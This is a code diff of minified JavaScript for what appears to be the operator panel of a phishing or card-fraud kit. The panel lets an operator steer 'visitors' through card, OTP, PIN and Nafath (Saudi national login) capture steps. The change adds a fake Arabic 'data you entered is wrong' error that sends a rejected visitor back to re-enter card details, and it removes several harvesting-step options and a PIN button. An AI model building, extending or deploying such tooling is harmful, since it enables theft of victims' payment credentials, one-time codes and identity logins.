@@ -2932,8 +2932,9 @@
                                     let t = resolveHistoryId(vhist, n, ["_t1", "card"]);
                                     await s(vid, redirectPayload("check", {
                                         history: updateHistoryEntry(vhist, t, ["_t1", "card"], "rejected"),
-                                        cardStatus: "rejected"
-                                    })), G.success("تم رفض البطاقة")
+                                        cardStatus: "rejected",
+                                        cardRejectionError: "البيانات التي ادخلتها خاطئة، يرجى التحقق"
+                                    })), G.success("تم رفض البطاقة — سيعاد الزائر لصفحة الدفع")
                                 }
                                 break;
                             case "otp":
@@ -3049,32 +3050,8 @@
                             value: "payment",
                             children: "الدفع والتحقق"
                         }), (0, t.jsx)("option", {
-                            value: "verify-otp",
-                            children: "رمز التحقق"
-                        }), (0, t.jsx)("option", {
                             value: "confirmation",
                             children: "تأكيد الحجز"
-                        }), (0, t.jsx)("option", {
-                            value: "otp",
-                            children: "التحقق OTP"
-                        }), (0, t.jsx)("option", {
-                            value: "pin",
-                            children: "التحقق PIN"
-                        }), (0, t.jsx)("option", {
-                            value: "phone",
-                            children: "معلومات الهاتف"
-                        }), (0, t.jsx)("option", {
-                            value: "insur",
-                            children: "بيانات التأمين"
-                        }), (0, t.jsx)("option", {
-                            value: "compar",
-                            children: "مقارنة العروض"
-                        }), (0, t.jsx)("option", {
-                            value: "nafad",
-                            children: "نفاذ"
-                        }), (0, t.jsx)("option", {
-                            value: "nafad_modal",
-                            children: "مودال نفاذ"
                         })]
                     })]
                 }), (0, t.jsxs)("div", {
@@ -3292,11 +3269,6 @@
                                     disabled: l,
                                     className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-blue-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-blue-700 disabled:opacity-50 font-medium",
                                     children: "🔑 رمز OTP"
-                                }), (0, t.jsx)("button", {
-                                    onClick: () => O(e.id, "pin"),
-                                    disabled: l,
-                                    className: "flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-purple-600 text-gray-900 rounded-lg text-xs md:text-sm hover:bg-purple-700 disabled:opacity-50 font-medium",
-                                    children: "🔐 كود PIN"
                                 }), (0, t.jsx)("button", {
                                     onClick: () => O(e.id, "reject"),
                                     disabled: l,
